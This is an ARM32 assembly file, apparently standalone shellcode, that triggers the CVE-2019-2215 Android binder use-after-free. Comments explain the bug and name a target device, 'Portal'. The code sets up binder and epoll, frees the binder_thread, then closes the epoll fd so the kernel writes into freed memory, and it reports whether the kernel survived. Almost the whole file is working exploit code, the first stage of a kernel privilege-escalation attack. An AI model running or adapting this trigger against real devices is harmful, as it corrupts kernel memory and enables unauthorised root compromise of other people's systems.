/*
 * uaf_trigger_test.s — Test CVE-2019-2215 UAF trigger survivability
 * ARM32 EABI shellcode
 *
 * Tests: does BINDER_THREAD_EXIT + close(epoll_fd) crash the kernel?
 *
 * The UAF occurs because:
 *   1. epoll_ctl(ADD) registers binder_fd → epoll holds ref to binder_thread's wait_queue
 *   2. BINDER_THREAD_EXIT frees the binder_thread struct
 *   3. close(epoll_fd) → ep_unregister_pollwait → remove_wait_queue
 *      → list_del on the freed memory (UAF!)
 *
 * If CONFIG_DEBUG_LIST is NOT enabled (confirmed for Portal), the list_del
 * just writes self-pointing pointers into freed memory → no crash.
 * The SLUB allocator may or may not have already reused the slab.
 *
 * Sequence:
 *   A1: openat("/dev/binder", O_RDWR)
 *   A2: ioctl(BINDER_SET_MAX_THREADS, &0)
 *   A3: epoll_create1(0)
 *   A4: epoll_ctl(EPOLL_CTL_ADD, binder_fd, {EPOLLIN})
 *   A5: ioctl(BINDER_WRITE_READ, BC_ENTER_LOOPER) — register as looper thread
 *   B1: ioctl(BINDER_THREAD_EXIT) — FREE the binder_thread
 *   B2: close(epoll_fd) — TRIGGER UAF (list_del on freed memory)
 *   B3: nanosleep(50ms) — let kernel settle
 *   B4: close(binder_fd)
 *   Return 0xBB00 if we survived
 *
 * Return value (R0):
 *   0xBB00 = UAF trigger SURVIVED (kernel didn't crash!)
 *   0xA1EE = openat failed, errno=EE
 *   0xA2EE = BINDER_SET_MAX_THREADS failed
 *   0xA3EE = epoll_create1 failed
 *   0xA4EE = epoll_ctl failed
 *   0xA5EE = BC_ENTER_LOOPER failed
 *   Kernel panic / device reboot = UAF crashed kernel
 */

    .syntax unified
    .arch armv7-a
    .text
    .align 2
    .globl _start
    .type _start, %function

.equ BINDER_SET_MAX_THREADS, 0x40046205
.equ BINDER_WRITE_READ,      0xc0186201
.equ BINDER_THREAD_EXIT,     0x40046208
.equ BC_ENTER_LOOPER,        0x0000000D
.equ EPOLL_CTL_ADD,          1
.equ EPOLLIN,                0x001
.equ O_RDWR,                 2

/* Stack layout (64 bytes):
 * SP+0x00: max_threads (4)
 * SP+0x04: binder_write_read (24 bytes)
 * SP+0x1C: BC_ENTER_LOOPER cmd (4)
 * SP+0x20: epoll_event (12)
 * SP+0x2C: timespec (8)
 * SP+0x34: padding
 */
.equ FRAME, 64

_start:
    push    {r4-r11, lr}
    sub     sp, sp, #FRAME

    /* ── A1: openat(AT_FDCWD, "/dev/binder", O_RDWR) ── */
    mvn     r0, #99             /* AT_FDCWD = -100 */
    adr     r1, str_binder
    mov     r2, #O_RDWR
    mov     r3, #0
    mov     r7, #320
    add     r7, r7, #2          /* 322 = __NR_openat */
    svc     #0
    cmp     r0, #0
    bmi     fail_a1
    mov     r4, r0              /* R4 = binder_fd */

    /* ── A2: ioctl(binder_fd, BINDER_SET_MAX_THREADS, &0) ── */
    mov     r0, r4
    ldr     r1, const_smt
    mov     r3, #0
    str     r3, [sp, #0]        /* max_threads = 0 */
    add     r2, sp, #0
    mov     r7, #54             /* __NR_ioctl */
    svc     #0
    cmp     r0, #0
    bmi     fail_a2

    /* ── A3: epoll_create1(0) ── */
    mov     r0, #0
    mov     r7, #352
    add     r7, r7, #5          /* 357 = __NR_epoll_create1 */
    svc     #0
    cmp     r0, #0
    bmi     fail_a3
    mov     r8, r0              /* R8 = epoll_fd */

    /* ── A4: epoll_ctl(epoll_fd, ADD, binder_fd, {EPOLLIN}) ── */
    mov     r3, #EPOLLIN
    str     r3, [sp, #0x20]     /* event.events */
    str     r4, [sp, #0x24]     /* event.data.fd */
    mov     r3, #0
    str     r3, [sp, #0x28]     /* event.data high */
    mov     r0, r8
    mov     r1, #EPOLL_CTL_ADD
    mov     r2, r4
    add     r3, sp, #0x20
    mov     r7, #248
    add     r7, r7, #3          /* 251 = __NR_epoll_ctl */
    svc     #0
    cmp     r0, #0
    bmi     fail_a4

    /* ── A5: ioctl(binder_fd, BINDER_WRITE_READ, BC_ENTER_LOOPER) ── */
    mov     r3, #BC_ENTER_LOOPER
    str     r3, [sp, #0x1C]     /* command word */
    mov     r3, #4
    str     r3, [sp, #0x04]     /* bwr.write_size = 4 */
    mov     r3, #0
    str     r3, [sp, #0x08]     /* bwr.write_consumed = 0 */
    add     r3, sp, #0x1C
    str     r3, [sp, #0x0C]     /* bwr.write_buffer = &cmd */
    mov     r3, #0
    str     r3, [sp, #0x10]     /* bwr.read_size = 0 */
    str     r3, [sp, #0x14]     /* bwr.read_consumed = 0 */
    str     r3, [sp, #0x18]     /* bwr.read_buffer = NULL */
    mov     r0, r4
    ldr     r1, const_bwr
    add     r2, sp, #0x04
    mov     r7, #54
    svc     #0
    cmp     r0, #0
    bmi     fail_a5

    /* ═══════════════════════════════════════════════════════
     * UAF TRIGGER — the critical test
     * ═══════════════════════════════════════════════════════ */

    /* ── B1: BINDER_THREAD_EXIT — free the binder_thread ── */
    mov     r0, r4              /* binder_fd */
    ldr     r1, const_bte
    mov     r2, #0
    mov     r7, #54             /* __NR_ioctl */
    svc     #0
    /* Don't check return — thread is freed regardless */

    /* ── B2: close(epoll_fd) — TRIGGER THE UAF! ── */
    /* ep_unregister_pollwait → remove_wait_queue → list_del
     * on freed binder_thread's wait_queue at WAITQUEUE_OFFSET.
     * If CONFIG_DEBUG_LIST is disabled, this writes to freed
     * memory without crashing. */
    mov     r0, r8              /* epoll_fd */
    mov     r7, #6              /* __NR_close */
    svc     #0

    /* ── B3: nanosleep(50ms) — let kernel settle ── */
    mov     r3, #0
    str     r3, [sp, #0x2C]     /* tv_sec = 0 */
    ldr     r3, const_50ms
    str     r3, [sp, #0x30]     /* tv_nsec = 50000000 */
    add     r0, sp, #0x2C
    mov     r1, #0
    mov     r7, #162            /* __NR_nanosleep */
    svc     #0

    /* ── B4: close(binder_fd) — cleanup ── */
    mov     r0, r4
    mov     r7, #6
    svc     #0

    /* ═══════════════════════════════════════════════════════
     * If we reach here, the UAF didn't crash the kernel!
     * ═══════════════════════════════════════════════════════ */
    mov     r0, #0xBB00
    b       done

    /* ── Error handlers ── */
fail_a1:
    rsb     r0, r0, #0
    mov     r1, #0xA100
    orr     r0, r0, r1
    b       done
fail_a2:
    rsb     r0, r0, #0
    mov     r1, #0xA200
    orr     r0, r0, r1
    b       done
fail_a3:
    rsb     r0, r0, #0
    ldr     r1, const_err_a3
    orr     r0, r0, r1
    b       done
fail_a4:
    rsb     r0, r0, #0
    ldr     r1, const_err_a4
    orr     r0, r0, r1
    b       done
fail_a5:
    rsb     r0, r0, #0
    ldr     r1, const_err_a5
    orr     r0, r0, r1
    b       done

done:
    add     sp, sp, #FRAME
    pop     {r4-r11, pc}

    /* ── Data pool ── */
    .align 2
const_smt:
    .word   0x40046205          /* BINDER_SET_MAX_THREADS */
const_bwr:
    .word   0xc0186201          /* BINDER_WRITE_READ */
const_bte:
    .word   0x40046208          /* BINDER_THREAD_EXIT */
const_50ms:
    .word   50000000            /* 50ms in nanoseconds */
const_err_a3:
    .word   0xA300
const_err_a4:
    .word   0xA400
const_err_a5:
    .word   0xA500
str_binder:
    .asciz  "/dev/binder"
    .align  2
